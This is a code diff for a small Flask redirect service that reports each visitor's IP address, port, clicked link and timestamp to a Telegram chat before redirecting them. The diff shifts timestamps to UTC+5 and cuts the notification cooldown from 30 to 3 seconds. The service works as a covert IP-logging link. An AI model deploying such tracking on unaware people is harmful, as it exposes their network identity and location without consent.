@@ -4,7 +4,7 @@ import requests
 import os
 from dotenv import load_dotenv
 load_dotenv()
-from datetime import datetime
+from datetime import datetime, timezone, timedelta
 import time
 
 app = Flask(__name__)
@@ -15,7 +15,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 last_sent = {}
 
 def send_telegram_message(link, ip, port):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    timestamp = datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")
     message = (
         f"🔗 Link: {link}\n"
         f"🌐 IP: {ip}\n"
@@ -40,7 +40,7 @@ def redirect_user(target_url):
 
     key = (decoded_url, user_ip)
     now = time.time()
-    if key in last_sent and now - last_sent[key] < 30:
+    if key in last_sent and now - last_sent[key] < 3:
         return redirect(decoded_url, code=302)
     
     last_sent[key] = now
